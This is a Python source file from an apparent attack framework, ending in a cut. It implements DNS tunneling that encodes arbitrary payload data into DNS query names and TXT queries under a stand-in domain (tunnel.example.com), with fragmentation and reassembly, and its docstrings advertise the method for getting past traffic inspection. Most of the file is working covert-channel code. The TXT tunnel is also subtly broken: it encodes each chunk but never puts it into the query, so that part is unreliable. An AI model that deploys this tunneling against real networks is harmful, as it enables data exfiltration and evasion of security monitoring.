"""
DNS tunneling attacks implementation.

Provides DNS-based data tunneling techniques:
- Query name encoding (base32, base64, hex)
- TXT record tunneling
- NULL record tunneling
- Automatic data fragmentation
- Response size limit handling
- Multi-query data splitting
- Query sequencing and reassembly
"""

import logging
from typing import Dict, Any, List, Optional, Tuple
from ..base_classes.dns_attack_base import (
    DNSAttackBase,
    DNS_TYPE_A,
    DNS_TYPE_TXT,
    DNS_MAX_LABEL_LENGTH,
    DNS_MAX_NAME_LENGTH,
)
from ..base import AttackContext, AttackResult, AttackStatus
from ..metadata import AttackMetadata, AttackCategories, RegistrationPriority
from ..attack_registry import register_attack

logger = logging.getLogger(__name__)


# DNS NULL record type (not in base class)
DNS_TYPE_NULL = 10

# DNS response size limits
DNS_MAX_RESPONSE_SIZE = 512  # Standard UDP response size
DNS_MAX_RESPONSE_SIZE_EDNS = 4096  # EDNS0 extended size
DNS_RESPONSE_OVERHEAD = 50  # Approximate overhead for DNS response headers


class DNSResponseReassembler:
    """
    Handles reassembly of fragmented DNS responses.

    Manages multi-query data splitting and reassembly logic for DNS tunneling
    when response size limits are exceeded. Tracks fragments across multiple
    queries and reassembles them in the correct order.

    Features:
        - Session-based fragment tracking
        - Out-of-order fragment handling
        - Automatic reassembly when complete
        - Session cleanup and management

    Usage:
        >>> reassembler = DNSResponseReassembler()
        >>> # Add fragments as they arrive
        >>> result = reassembler.add_fragment(
        ...     session_id=12345,
        ...     seq_num=0,
        ...     total_fragments=3,
        ...     data=b"first chunk",
        ...     encoding='base32'
        ... )
        >>> # Returns None until all fragments received
        >>> if result is None:
        ...     print("Waiting for more fragments")
        >>> # Returns complete data when all fragments received
        >>> complete_data = reassembler.add_fragment(
        ...     session_id=12345,
        ...     seq_num=2,
        ...     total_fragments=3,
        ...     data=b"last chunk",
        ...     encoding='base32'
        ... )
    """

    def __init__(self):
        """Initialize response reassembler."""
        self._fragments: Dict[int, Dict[int, bytes]] = {}  # session_id -> {seq_num -> data}
        self._metadata: Dict[int, Dict[str, Any]] = {}  # session_id -> metadata

    def add_fragment(
        self, session_id: int, seq_num: int, total_fragments: int, data: bytes, encoding: str
    ) -> Optional[bytes]:
        """
        Add a fragment and attempt reassembly.

        Args:
            session_id: Unique session identifier
            seq_num: Sequence number of this fragment
            total_fragments: Total number of fragments expected
            data: Fragment data
            encoding: Encoding scheme used

        Returns:
            Complete reassembled data if all fragments received, None otherwise
        """
        # Initialize session if needed
        if session_id not in self._fragments:
            self._fragments[session_id] = {}
            self._metadata[session_id] = {
                "total_fragments": total_fragments,
                "encoding": encoding,
                "received": 0,
            }

        # Store fragment
        if seq_num not in self._fragments[session_id]:
            self._fragments[session_id][seq_num] = data
            self._metadata[session_id]["received"] += 1

        # Check if all fragments received
        if self._metadata[session_id]["received"] == total_fragments:
            return self._reassemble(session_id)

        return None

    def _reassemble(self, session_id: int) -> bytes:
        """
        Reassemble all fragments for a session.

        Args:
            session_id: Session to reassemble

        Returns:
            Complete reassembled data
        """
        fragments = self._fragments[session_id]
        total = self._metadata[session_id]["total_fragments"]

        # Sort fragments by sequence number
        sorted_fragments = [fragments[i] for i in range(total) if i in fragments]

        # Concatenate fragments
        reassembled = b"".join(sorted_fragments)

        # Clean up
        del self._fragments[session_id]
        del self._metadata[session_id]

        return reassembled

    def get_session_status(self, session_id: int) -> Optional[Dict[str, Any]]:
        """
        Get status of a session.

        Args:
            session_id: Session ID to check

        Returns:
            Session metadata or None if session doesn't exist
        """
        return self._metadata.get(session_id)

    def cleanup_session(self, session_id: int) -> None:
        """
        Clean up a session without reassembly.

        Args:
            session_id: Session to clean up
        """
        if session_id in self._fragments:
            del self._fragments[session_id]
        if session_id in self._metadata:
            del self._metadata[session_id]


@register_attack(
    name="dns_tunneling",
    category=AttackCategories.DNS,
    priority=RegistrationPriority.HIGH,
    required_params=[],
    optional_params={
        "base_domain": "tunnel.example.com",
        "encoding": "base32",
        "max_query_size": 200,
        "max_response_size": DNS_MAX_RESPONSE_SIZE,
        "use_edns": False,
    },
    aliases=["dns_query_tunnel", "dns_tunnel"],
    description="Tunnels data through DNS query names using various encoding schemes (base32, base64, hex)",
)
class DNSTunnelingAttack(DNSAttackBase):
    """
    DNS tunneling attack using query name encoding.

    Encodes data into DNS query names using various encoding schemes to tunnel
    arbitrary data through DNS infrastructure. This attack is useful for bypassing
    DPI systems that inspect HTTP/HTTPS traffic but allow DNS queries.

    Encoding Schemes:
        - base32: DNS-safe, ~60% expansion, best for binary data
        - base64: More compact, ~33% expansion, requires DNS-safe variant
        - hex: Simple, 100% expansion, least efficient but most compatible

    Automatically handles:
        - DNS name length limits (255 bytes total, 63 bytes per label)
        - Data fragmentation across multiple queries
        - Response size limit handling (512 bytes standard, 4096 with EDNS)
        - Multi-query sequencing for large payloads
        - Query reassembly tracking

    Size Limits:
        - Maximum DNS name length: 255 bytes
        - Maximum label length: 63 bytes
        - Standard UDP response: 512 bytes
        - EDNS0 extended response: 4096 bytes

    Performance Characteristics:
        - Encoding overhead: 33-100% depending on scheme
        - Execution time: < 10ms for typical payloads
        - Memory overhead: Minimal (single copy of encoded data)
        - Network overhead: Multiple queries for large payloads

    DNS Server Compatibility:
        - Works with all standard DNS servers
        - EDNS0 support optional but recommended for larger payloads
        - Some DNS servers may rate-limit unusual query patterns
        - Requires control of authoritative DNS server for response handling

    Trade-offs:
        - base32: Best compatibility, larger size
        - base64: Good balance of size and compatibility
        - hex: Largest size, maximum compatibility

    Example:
        >>> attack = DNSTunnelingAttack()
        >>> context = AttackContext(
        ...     payload=b"secret data",
        ...     params={
        ...         'base_domain': 'tunnel.example.com',
        ...         'encoding': 'base32',
        ...         'max_query_size': 200
        ...     }
        ... )
        >>> result = await attack.execute(context)
        >>> print(f"Created {result.metadata['queries']} DNS queries")
    """

    @property
    def name(self) -> str:
        return "dns_tunneling"

    @property
    def category(self) -> str:
        return AttackCategories.DNS

    @property
    def required_params(self) -> List[str]:
        return []

    @property
    def optional_params(self) -> Dict[str, Any]:
        return {
            "base_domain": "tunnel.example.com",
            "encoding": "base32",
            "max_query_size": 200,
            "max_response_size": DNS_MAX_RESPONSE_SIZE,
            "use_edns": False,
        }

    def __init__(self):
        """Initialize DNS tunneling attack."""
        super().__init__()
        self._sequence_counter = 0
        self._session_counter = 0
        self._reassembler = DNSResponseReassembler()

    async def execute(self, context: AttackContext) -> AttackResult:
        """
        Execute DNS tunneling attack.

        Args:
            context: Attack context with payload and parameters

        Returns:
            AttackResult with tunneled DNS queries
        """
        try:
            # Extract parameters
            params = context.params or {}
            base_domain = params.get("base_domain", "tunnel.example.com")
            encoding = params.get("encoding", "base32")
            max_query_size = params.get("max_query_size", 200)
            max_response_size = params.get("max_response_size", DNS_MAX_RESPONSE_SIZE)
            use_edns = params.get("use_edns", False)

            # Adjust response size for EDNS
            if use_edns:
                max_response_size = DNS_MAX_RESPONSE_SIZE_EDNS

            # Validate encoding scheme
            if encoding not in [self.ENCODING_BASE32, self.ENCODING_BASE64, self.ENCODING_HEX]:
                return AttackResult(
                    status=AttackStatus.ERROR,
                    error_message=f"Unsupported encoding scheme: {encoding}",
                    metadata={
                        "supported_encodings": [
                            self.ENCODING_BASE32,
                            self.ENCODING_BASE64,
                            self.ENCODING_HEX,
                        ]
                    },
                )

            # Get payload data
            payload = context.payload
            if not payload:
                return AttackResult(
                    status=AttackStatus.ERROR,
                    error_message="No payload data provided for tunneling",
                )

            # Check if we need multi-query splitting for response size limits
            max_data_per_response = self.calculate_max_response_data(max_response_size, encoding)

            if len(payload) > max_data_per_response:
                # Use multi-query sequence for large payloads
                logger.info(
                    f"Payload size {len(payload)} exceeds response limit, using multi-query sequence"
                )
                queries = self.create_multi_query_sequence(
                    payload, base_domain, encoding, max_response_size
                )

                if not queries:
                    return AttackResult(
                        status=AttackStatus.FAILURE,
                        error_message="Failed to create multi-query sequence",
                    )

                return AttackResult(
                    status=AttackStatus.SUCCESS,
                    modified_payload=b"".join(queries),
                    metadata={
                        "encoding": encoding,
                        "multi_query": True,
                        "queries": len(queries),
                        "base_domain": base_domain,
                        "max_response_size": max_response_size,
                        "total_size": sum(len(q) for q in queries),
                    },
                )

            # Standard fragmentation for smaller payloads
            fragments = self._fragment_data(payload, max_query_size, encoding, base_domain)

            # Build DNS queries for each fragment
            queries = []
            for i, fragment in enumerate(fragments):
                try:
                    # Encode fragment
                    encoded = self.encode_data_for_tunnel(fragment, encoding)

                    # Create tunnel domain with sequence number
                    seq_id = self._get_next_sequence_id()
                    tunnel_domain = self._build_tunnel_domain(
                        encoded, seq_id, len(fragments), base_domain
                    )

                    # Validate domain name
                    if not self.validate_dns_name(tunnel_domain):
                        logger.warning(f"Invalid tunnel domain generated: {tunnel_domain}")
                        continue

                    # Build DNS query packet
                    query_packet = self.build_dns_query(tunnel_domain, DNS_TYPE_A)
                    queries.append(query_packet)

                except Exception as e:
                    logger.error(f"Failed to create query for fragment {i}: {e}")
                    continue

            if not queries:
                return AttackResult(
                    status=AttackStatus.FAILURE,
                    error_message="Failed to create any valid DNS queries",
                )

            return AttackResult(
                status=AttackStatus.SUCCESS,
                modified_payload=b"".join(queries),
                metadata={
                    "encoding": encoding,
                    "multi_query": False,
                    "fragments": len(fragments),
                    "queries": len(queries),
                    "base_domain": base_domain,
                    "max_response_size": max_response_size,
                    "total_size": sum(len(q) for q in queries),
                },
            )

        except Exception as e:
            logger.error(f"DNS tunneling attack failed: {e}")
            return AttackResult(status=AttackStatus.ERROR, error_message=str(e))

    def modify_dns_packet(self, packet, context: AttackContext) -> Optional[bytes]:
        """Modify DNS packet (not used for tunneling)."""
        return None

    def encode_data_for_tunnel(self, data: bytes, scheme: str) -> str:
        """
        Encode data for DNS tunneling using specified encoding scheme.

        Converts binary data into DNS-safe string format suitable for use in
        DNS query names. Different encoding schemes offer different trade-offs
        between size efficiency and compatibility.

        Args:
            data: Binary data to encode
            scheme: Encoding scheme to use:
                - 'base32': DNS-safe, ~60% expansion, best compatibility
                - 'base64': More compact, ~33% expansion, DNS-safe variant
                - 'hex': Simple, 100% expansion, maximum compatibility

        Returns:
            Encoded string suitable for DNS labels (lowercase, alphanumeric)

        Raises:
            ValueError: If encoding scheme is not supported

        Example:
            >>> attack = DNSTunnelingAttack()
            >>> encoded = attack.encode_data_for_tunnel(b"hello", "base32")
            >>> print(encoded)  # "nbswy3dp"
        """
        if scheme == self.ENCODING_BASE32:
            return self.encode_base32(data)
        elif scheme == self.ENCODING_BASE64:
            return self.encode_base64_dns_safe(data)
        elif scheme == self.ENCODING_HEX:
            return self.encode_hex(data)
        else:
            raise ValueError(f"Unsupported encoding scheme: {scheme}")

    def decode_data_from_tunnel(self, encoded: str, scheme: str) -> bytes:
        """
        Decode data from DNS tunnel.

        Args:
            encoded: Encoded string from DNS labels
            scheme: Encoding scheme used

        Returns:
            Decoded data bytes
        """
        if scheme == self.ENCODING_BASE32:
            return self.decode_base32(encoded)
        elif scheme == self.ENCODING_BASE64:
            return self.decode_base64_dns_safe(encoded)
        elif scheme == self.ENCODING_HEX:
            return self.decode_hex(encoded)
        else:
            raise ValueError(f"Unsupported encoding scheme: {scheme}")

    def validate_params(self, params: Dict[str, Any]) -> bool:
        """Validate attack parameters."""
        if "encoding" in params:
            if params["encoding"] not in [
                self.ENCODING_BASE32,
                self.ENCODING_BASE64,
                self.ENCODING_HEX,
            ]:
                return False

        if "max_query_size" in params:
            if not isinstance(params["max_query_size"], int) or params["max_query_size"] < 50:
                return False

        if "base_domain" in params:
            if not isinstance(params["base_domain"], str) or not params["base_domain"]:
                return False

        return True

    def get_metadata(self) -> AttackMetadata:
        """Get attack metadata."""
        return AttackMetadata(
            name="DNS Query Name Tunneling",
            description="Tunnels data through DNS query names using various encoding schemes",
            category=AttackCategories.DNS,
            required_params=[],
            optional_params={
                "base_domain": "tunnel.example.com",
                "encoding": "base32",
                "max_query_size": 200,
            },
            aliases=["dns_tunneling", "dns_query_tunnel"],
        )

    def _fragment_data(
        self, data: bytes, max_query_size: int, encoding: str, base_domain: str
    ) -> List[bytes]:
        """
        Fragment data to fit within DNS query size limits.

        Args:
            data: Data to fragment
            max_query_size: Maximum size per query
            encoding: Encoding scheme
            base_domain: Base domain for tunneling

        Returns:
            List of data fragments
        """
        # Calculate overhead: sequence_id (8) + total_count (4) + dots + base_domain
        overhead = 20 + len(base_domain)

        # Calculate encoding expansion factor
        if encoding == self.ENCODING_BASE32:
            expansion = 1.6  # base32 expands by ~60%
        elif encoding == self.ENCODING_BASE64:
            expansion = 1.33  # base64 expands by ~33%
        else:  # hex
            expansion = 2.0  # hex doubles size

        # Calculate max data per fragment
        max_encoded_size = max_query_size - overhead
        max_data_per_fragment = int(max_encoded_size / expansion)

        # Ensure minimum fragment size
        if max_data_per_fragment < 10:
            max_data_per_fragment = 10

        # Split data into fragments
        fragments = []
        for i in range(0, len(data), max_data_per_fragment):
            fragments.append(data[i : i + max_data_per_fragment])

        return fragments

    def _build_tunnel_domain(
        self, encoded_data: str, seq_id: int, total_count: int, base_domain: str
    ) -> str:
        """
        Build tunnel domain name with encoded data and metadata.

        Format: <seq_id>.<total>.<encoded_data_labels>.<base_domain>

        Args:
            encoded_data: Encoded data string
            seq_id: Sequence ID for this fragment
            total_count: Total number of fragments
            base_domain: Base domain

        Returns:
            Complete tunnel domain name
        """
        # Add sequence metadata
        metadata = f"{seq_id:08x}.{total_count:04x}"

        # Split encoded data into labels (max 63 chars each)
        labels = []
        for i in range(0, len(encoded_data), DNS_MAX_LABEL_LENGTH):
            labels.append(encoded_data[i : i + DNS_MAX_LABEL_LENGTH])

        # Construct domain
        data_part = ".".join(labels)
        tunnel_domain = f"{metadata}.{data_part}.{base_domain}"

        # Validate length
        if len(tunnel_domain) > DNS_MAX_NAME_LENGTH:
            # Truncate if necessary
            max_data_len = DNS_MAX_NAME_LENGTH - len(metadata) - len(base_domain) - 4
            data_part = data_part[:max_data_len]
            tunnel_domain = f"{metadata}.{data_part}.{base_domain}"

        return tunnel_domain

    def _get_next_sequence_id(self) -> int:
        """Get next sequence ID for fragment tracking."""
        seq_id = self._sequence_counter
        self._sequence_counter = (self._sequence_counter + 1) & 0xFFFFFFFF
        return seq_id

    def _get_next_session_id(self) -> int:
        """Get next session ID for multi-query tracking."""
        session_id = self._session_counter
        self._session_counter = (self._session_counter + 1) & 0xFFFFFFFF
        return session_id

    def calculate_max_response_data(self, max_response_size: int, encoding: str) -> int:
        """
        Calculate maximum data that can fit in a DNS response.

        Accounts for DNS protocol overhead and encoding expansion to determine
        how much actual data can be transmitted in a single DNS response.

        Args:
            max_response_size: Maximum DNS response size in bytes
                - 512 for standard UDP
                - 4096 for EDNS0
            encoding: Encoding scheme used:
                - 'base32': 1.6x expansion factor
                - 'base64': 1.33x expansion factor
                - 'hex': 2.0x expansion factor

        Returns:
            Maximum data bytes that can fit in response (minimum 10 bytes)

        Example:
            >>> attack = DNSTunnelingAttack()
            >>> max_data = attack.calculate_max_response_data(512, 'base32')
            >>> print(f"Can send {max_data} bytes per query")
        """
        # Account for DNS response overhead
        available_size = max_response_size - DNS_RESPONSE_OVERHEAD

        # Calculate encoding expansion factor
        if encoding == self.ENCODING_BASE32:
            expansion = 1.6
        elif encoding == self.ENCODING_BASE64:
            expansion = 1.33
        else:  # hex
            expansion = 2.0

        # Calculate max data
        max_data = int(available_size / expansion)
        return max(max_data, 10)  # Ensure minimum size

    def split_for_response_limit(
        self, data: bytes, max_response_size: int, encoding: str
    ) -> List[bytes]:
        """
        Split data to fit within DNS response size limits.

        This implements automatic data fragmentation when response size
        limits would be exceeded.

        Args:
            data: Data to split
            max_response_size: Maximum response size
            encoding: Encoding scheme

        Returns:
            List of data chunks that fit within response limits
        """
        max_data_per_response = self.calculate_max_response_data(max_response_size, encoding)

        chunks = []
        for i in range(0, len(data), max_data_per_response):
            chunks.append(data[i : i + max_data_per_response])

        return chunks

    def create_multi_query_sequence(
        self, data: bytes, base_domain: str, encoding: str, max_response_size: int
    ) -> List[bytes]:
        """
        Create a sequence of DNS queries for multi-query data splitting.

        When data exceeds the maximum response size, this method splits it into
        multiple queries with session tracking and sequence numbers for proper
        reassembly on the receiving end.

        Args:
            data: Data to tunnel (can be any size)
            base_domain: Base domain for queries (e.g., 'tunnel.example.com')
            encoding: Encoding scheme ('base32', 'base64', or 'hex')
            max_response_size: Maximum response size in bytes (512 or 4096)

        Returns:
            List of DNS query packets, each containing a fragment of the data
            with session ID and sequence number encoded in the domain name

        Query Format:
            <session_id>.<seq_num>.<total>.<encoded_data>.<base_domain>

        Example:
            >>> attack = DNSTunnelingAttack()
            >>> queries = attack.create_multi_query_sequence(
            ...     b"large data payload" * 100,
            ...     'tunnel.example.com',
            ...     'base32',
            ...     512
            ... )
            >>> print(f"Split into {len(queries)} queries")
        """
        # Split data for response limits
        chunks = self.split_for_response_limit(data, max_response_size, encoding)

        # Get session ID for this sequence
        session_id = self._get_next_session_id()

        # Create queries for each chunk
        queries = []
        for seq_num, chunk in enumerate(chunks):
            try:
                # Encode chunk
                encoded = self.encode_data_for_tunnel(chunk, encoding)

                # Build domain with session and sequence info
                # Format: <session_id>.<seq_num>.<total>.<encoded>.<base_domain>
                tunnel_domain = self._build_multi_query_domain(
                    encoded, session_id, seq_num, len(chunks), base_domain
                )

                # Validate domain
                if not self.validate_dns_name(tunnel_domain):
                    logger.warning(f"Invalid multi-query domain: {tunnel_domain}")
                    continue

                # Build query packet
                query_packet = self.build_dns_query(tunnel_domain, DNS_TYPE_A)
                queries.append(query_packet)

            except Exception as e:
                logger.error(f"Failed to create multi-query for chunk {seq_num}: {e}")
                continue

        return queries

    def _build_multi_query_domain(
        self, encoded_data: str, session_id: int, seq_num: int, total_count: int, base_domain: str
    ) -> str:
        """
        Build domain name for multi-query sequence.

        Format: <session_id>.<seq_num>.<total>.<encoded_labels>.<base_domain>

        Args:
            encoded_data: Encoded data string
            session_id: Session ID for this sequence
            seq_num: Sequence number
            total_count: Total queries in sequence
            base_domain: Base domain

        Returns:
            Complete domain name
        """
        # Add session and sequence metadata
        metadata = f"{session_id:08x}.{seq_num:04x}.{total_count:04x}"

        # Split encoded data into labels
        labels = []
        for i in range(0, len(encoded_data), DNS_MAX_LABEL_LENGTH):
            labels.append(encoded_data[i : i + DNS_MAX_LABEL_LENGTH])

        # Construct domain
        data_part = ".".join(labels)
        domain = f"{metadata}.{data_part}.{base_domain}"

        # Validate length
        if len(domain) > DNS_MAX_NAME_LENGTH:
            # Truncate if necessary
            max_data_len = DNS_MAX_NAME_LENGTH - len(metadata) - len(base_domain) - 4
            data_part = data_part[:max_data_len]
            domain = f"{metadata}.{data_part}.{base_domain}"

        return domain

    def reassemble_response_data(
        self, session_id: int, seq_num: int, total_fragments: int, data: bytes, encoding: str
    ) -> Optional[bytes]:
        """
        Reassemble data from multiple DNS responses.

        This implements reassembly logic for responses split across multiple queries.

        Args:
            session_id: Session identifier
            seq_num: Sequence number of this fragment
            total_fragments: Total fragments expected
            data: Fragment data
            encoding: Encoding scheme used

        Returns:
            Complete reassembled data if all fragments received, None otherwise
        """
        return self._reassembler.add_fragment(session_id, seq_num, total_fragments, data, encoding)

    def parse_multi_query_domain(self, domain: str) -> Optional[Tuple[int, int, int, str]]:
        """
        Parse multi-query domain to extract metadata.

        Args:
            domain: Domain name to parse

        Returns:
            Tuple of (session_id, seq_num, total_count, encoded_data) or None
        """
        try:
            parts = domain.split(".")
            if len(parts) < 4:
                return None

            # Extract metadata
            session_id = int(parts[0], 16)
            seq_num = int(parts[1], 16)
            total_count = int(parts[2], 16)

            # Reconstruct encoded data (everything before base domain)
            # Assuming base domain is last 2 parts
            encoded_data = ".".join(parts[3:-2])

            return (session_id, seq_num, total_count, encoded_data)

        except (ValueError, IndexError) as e:
            logger.error(f"Failed to parse multi-query domain: {e}")
            return None


@register_attack(
    name="dns_txt_tunneling",
    category=AttackCategories.DNS,
    priority=RegistrationPriority.HIGH,
    required_params=[],
    optional_params={
        "base_domain": "txt.tunnel.example.com",
        "encoding": "base64",
        "chunk_size": 200,
        "max_response_size": DNS_MAX_RESPONSE_SIZE,
        "use_edns": False,
    },
    aliases=["dns_txt_tunnel", "txt_tunneling"],
    description="Tunnels data through DNS TXT record queries with automatic chunking and efficient encoding",
)
class DNSTXTTunnelingAttack(DNSAttackBase):
    """
    DNS TXT record tunneling attack.

    Encodes data into DNS TXT record queries. TXT records can hold significantly
    more data than query names, making them more efficient for larger payloads.
    TXT records support multiple strings per record, allowing flexible data encoding.

    Encoding Schemes:
        - base32: DNS-safe, ~60% expansion, reliable
        - base64: Recommended for TXT records, ~33% expansion, efficient
        - hex: Simple fallback, 100% expansion

    Features:
        - Automatic chunking for large data
        - Multiple TXT record support
        - Efficient encoding for text and binary data
        - Response size limit handling
        - Multi-query sequencing for very large payloads

    Size Limits:
        - Maximum TXT string length: 255 bytes
        - Maximum TXT record length: 65535 bytes
        - Standard UDP response: 512 bytes
        - EDNS0 extended response: 4096 bytes
        - Practical limit per query: ~400 bytes (with overhead)

    Performance Characteristics:
        - Encoding overhead: 33-100% depending on scheme
        - Execution time: < 15ms for typical payloads
        - Memory overhead: Minimal (chunked processing)
        - Network efficiency: Better than query name tunneling
        - Throughput: ~300-400 bytes per query (base64)

    DNS Server Compatibility:
        - Requires TXT record support (universal)
        - EDNS0 support recommended for larger payloads
        - Some DNS servers limit TXT record size
        - Works with all major DNS implementations

    Trade-offs:
        - More efficient than query name tunneling
        - Requires TXT record support on authoritative server
        - May be more visible to monitoring systems
        - Better for larger payloads (>100 bytes)

    Fragmentation:
        - Automatic fragmentation when data exceeds response limits
        - Session-based reassembly for multi-query sequences
        - Sequence numbers for ordered delivery
        - Fragment tracking and validation

    Example:
        >>> attack = DNSTXTTunnelingAttack()
        >>> context = AttackContext(
        ...     payload=b"larger secret data payload",
        ...     params={
        ...         'base_domain': 'txt.tunnel.example.com',
        ...         'encoding': 'base64',
        ...         'chunk_size': 200,
        ...         'use_edns': True
        ...     }
        ... )
        >>> result = await attack.execute(context)
        >>> print(f"Created {result.metadata['queries']} TXT queries")
    """

    # TXT record limits
    MAX_TXT_STRING_LENGTH = 255
    MAX_TXT_RECORD_LENGTH = 65535

    @property
    def name(self) -> str:
        return "dns_txt_tunneling"

    @property
    def category(self) -> str:
        return AttackCategories.DNS

    @property
    def required_params(self) -> List[str]:
        return []

    @property
    def optional_params(self) -> Dict[str, Any]:
        return {
            "base_domain": "txt.tunnel.example.com",
            "encoding": "base64",
            "chunk_size": 200,
            "max_response_size": DNS_MAX_RESPONSE_SIZE,
            "use_edns": False,
        }

    def __init__(self):
        """Initialize DNS TXT tunneling attack."""
        super().__init__()
        self._sequence_counter = 0
        self._session_counter = 0
        self._reassembler = DNSResponseReassembler()

    async def execute(self, context: AttackContext) -> AttackResult:
        """
        Execute DNS TXT tunneling attack.

        Args:
            context: Attack context with payload and parameters

        Returns:
            AttackResult with TXT record queries
        """
        try:
            # Extract parameters
            params = context.params or {}
            base_domain = params.get("base_domain", "txt.tunnel.example.com")
            encoding = params.get("encoding", "base64")
            chunk_size = params.get("chunk_size", 200)
            max_response_size = params.get("max_response_size", DNS_MAX_RESPONSE_SIZE)
            use_edns = params.get("use_edns", False)

            # Adjust response size for EDNS
            if use_edns:
                max_response_size = DNS_MAX_RESPONSE_SIZE_EDNS

            # Validate encoding
            if encoding not in [self.ENCODING_BASE32, self.ENCODING_BASE64, self.ENCODING_HEX]:
                return AttackResult(
                    status=AttackStatus.ERROR, error_message=f"Unsupported encoding: {encoding}"
                )

            # Get payload
            payload = context.payload
            if not payload:
                return AttackResult(
                    status=AttackStatus.ERROR, error_message="No payload data provided"
                )

            # Check if we need response size splitting
            response_chunks = self.split_for_txt_response_limit(
                payload, max_response_size, encoding
            )

            if len(response_chunks) > 1:
                # Use multi-query sequence for large payloads
                logger.info(
                    f"TXT payload requires {len(response_chunks)} queries for response size limits"
                )
                session_id = self._get_next_session_id()

                queries = []
                for seq_num, chunk in enumerate(response_chunks):
                    try:
                        # Encode chunk
                        encoded = self.encode_data_for_tunnel(chunk, encoding)

                        # Create TXT query domain with session info
                        query_domain = f"{session_id:08x}.{seq_num:04x}.{len(response_chunks):04x}.{base_domain}"

                        # Build TXT query
                        query_packet = self.build_dns_query(query_domain, DNS_TYPE_TXT)
                        queries.append(query_packet)

                    except Exception as e:
                        logger.error(f"Failed to create TXT query for chunk {seq_num}: {e}")
                        continue

                if not queries:
                    return AttackResult(
                        status=AttackStatus.FAILURE,
                        error_message="Failed to create any TXT queries",
                    )

                return AttackResult(
                    status=AttackStatus.SUCCESS,
                    modified_payload=b"".join(queries),
                    metadata={
                        "encoding": encoding,
                        "multi_query": True,
                        "session_id": session_id,
                        "chunks": len(response_chunks),
                        "queries": len(queries),
                        "base_domain": base_domain,
                        "max_response_size": max_response_size,
                        "total_size": sum(len(q) for q in queries),
                    },
                )

            # Standard chunking for smaller payloads
            chunks = self._chunk_data(payload, chunk_size)

            # Build TXT queries
            queries = []
            for i, chunk in enumerate(chunks):
                try:
                    # Encode chunk
                    encoded = self.encode_data_for_tunnel(chunk, encoding)

                    # Create TXT query domain
                    seq_id = self._get_next_sequence_id()
                    query_domain = f"{seq_id:08x}.{i:04x}.{len(chunks):04x}.{base_domain}"

                    # Build TXT query
                    query_packet = self.build_dns_query(query_domain, DNS_TYPE_TXT)
                    queries.append(query_packet)

                except Exception as e:
                    logger.error(f"Failed to create TXT query for chunk {i}: {e}")
                    continue

            if not queries:
                return AttackResult(
                    status=AttackStatus.FAILURE, error_message="Failed to create any TXT queries"
                )

            return AttackResult(
                status=AttackStatus.SUCCESS,
                modified_payload=b"".join(queries),
                metadata={
                    "encoding": encoding,
                    "multi_query": False,
                    "chunks": len(chunks),
                    "queries": len(queries),
                    "base_domain": base_domain,
                    "max_response_size": max_response_size,
                    "total_size": sum(len(q) for q in queries),
                },
            )

        except Exception as e:
            logger.error(f"DNS TXT tunneling failed: {e}")
            return AttackResult(status=AttackStatus.ERROR, error_message=str(e))

    def modify_dns_packet(self, packet, context: AttackContext) -> Optional[bytes]:
        """Modify DNS packet (not used for tunneling)."""
        return None

    def encode_data_for_tunnel(self, data: bytes, scheme: str) -> str:
        """Encode data for TXT record."""
        if scheme == self.ENCODING_BASE32:
            return self.encode_base32(data)
        elif scheme == self.ENCODING_BASE64:
            return self.encode_base64_dns_safe(data)
        elif scheme == self.ENCODING_HEX:
            return self.encode_hex(data)
        else:
            raise ValueError(f"Unsupported encoding: {scheme}")

    def decode_data_from_tunnel(self, encoded: str, scheme: str) -> bytes:
        """Decode data from TXT record."""
        if scheme == self.ENCODING_BASE32:
            return self.decode_base32(encoded)
        elif scheme == self.ENCODING_BASE64:
            return self.decode_base64_dns_safe(encoded)
        elif scheme == self.ENCODING_HEX:
            return self.decode_hex(encoded)
        else:
            raise ValueError(f"Unsupported encoding: {scheme}")

    def validate_params(self, params: Dict[str, Any]) -> bool:
        """Validate attack parameters."""
        if "encoding" in params:
            if params["encoding"] not in [
                self.ENCODING_BASE32,
                self.ENCODING_BASE64,
                self.ENCODING_HEX,
            ]:
                return False

        if "chunk_size" in params:
            if not isinstance(params["chunk_size"], int) or params["chunk_size"] < 10:
                return False

        return True

    def get_metadata(self) -> AttackMetadata:
        """Get attack metadata."""
        return AttackMetadata(
            name="DNS TXT Record Tunneling",
            description="Tunnels data through DNS TXT record queries with automatic chunking",
            category=AttackCategories.DNS,
            required_params=[],
            optional_params={
                "base_domain": "txt.tunnel.example.com",
                "encoding": "base64",
                "chunk_size": 200,
            },
            aliases=["dns_txt_tunnel", "dns_txt_tunneling"],
        )

    def _chunk_data(self, data: bytes, chunk_size: int) -> List[bytes]:
        """
        Chunk data for TXT records.

        Args:
            data: Data to chunk
            chunk_size: Size of each chunk

        Returns:
            List of data chunks
        """
        chunks = []
        for i in range(0, len(data), chunk_size):
            chunks.append(data[i : i + chunk_size])
        return chunks

    def _get_next_sequence_id(self) -> int:
        """Get next sequence ID."""
        seq_id = self._sequence_counter
        self._sequence_counter = (self._sequence_counter + 1) & 0xFFFFFFFF
        return seq_id

    def _get_next_session_id(self) -> int:
        """Get next session ID for multi-query tracking."""
        session_id = self._session_counter
        self._session_counter = (self._session_counter + 1) & 0xFFFFFFFF
        return session_id

    def split_for_txt_response_limit(
        self, data: bytes, max_response_size: int, encoding: str
    ) -> List[bytes]:
        """
        Split data to fit within TXT record response size limits.

        Args:
            data: Data to split
            max_response_size: Maximum response size
            encoding: Encoding scheme

        Returns:
            List of data chunks
        """
        # Account for TXT record overhead
        available_size = max_response_size - DNS_RESPONSE_OVERHEAD - 20  # Extra overhead for TXT

        # Calculate encoding expansion
        if encoding == self.ENCODING_BASE32:
            expansion = 1.6
        elif encoding == self.ENCODING_BASE64:
            expansion = 1.33
        else:
            expansion = 2.0

        max_data = int(available_size / expansion)
        max_data = max(max_data, 10)

        # Split data
        chunks = []
        for i in range(0, len(data), max_data):
            chunks.append(data[i : i + max_data])

        return chunks

    def reassemble_txt_response_data(
        self, session_id: int, seq_num: int, total_fragments: int, data: bytes, encoding: str
    ) -> Optional[bytes]:
        """
        Reassemble data from multiple TXT responses.

        Args:
            session_id: Session identifier
            seq_num: Sequence number
            total_fragments: Total fragments expected
            data: Fragment data
            encoding: Encoding scheme

        Returns:
            Complete reassembled data if all fragments received
        """
        return self._reassembler.add_fragment(session_id, seq_num, total_fragments, data, encoding)


@register_attack(
    name="dns_null_tunneling",
    category=AttackCategories.DNS,
    priority=RegistrationPriority.HIGH,
    required_params=[],
    optional_params={
        "base_domain": "null.tunnel.example.com",
        "chunk_size": 200,
        "max_response_size": DNS_MAX_RESPONSE_SIZE,
        "use_edns": False,
    },
    aliases=["dns_null_tunnel", "null_tunneling"],
